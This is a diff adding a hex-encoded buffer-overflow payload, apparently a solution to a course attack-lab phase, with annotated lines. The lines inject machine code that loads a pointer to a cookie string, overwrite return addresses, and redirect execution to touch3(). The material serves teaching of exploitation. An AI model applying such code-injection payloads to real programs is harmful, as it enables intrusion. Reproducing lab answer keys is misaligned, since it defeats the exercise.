@@ -1,0 +1,11 @@
+48 bf e0 ca 66 55 00 00 /* performs mov 0x5566cae0, %rdi. now %rdi points to string cookie */
+00 00 c3 00 00 00 00 00 /* retq */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+98 ca 66 55 00 00 00 00 /* call the code at the top of the stack */
+98 ca 66 55 00 00 00 00 /* call again for 16-byte alignment */
+74 1d 40 00 00 00 00 00 /* call touch3() with %rdi pointing to string cookie */
+00 22 40 00 00 00 00 00 /* call whatever was on the stack before this */
+32 32 33 65 63 36 39 38 /* the string cookie! at address __e0. */
+00 00 00 00 00 00 00 00
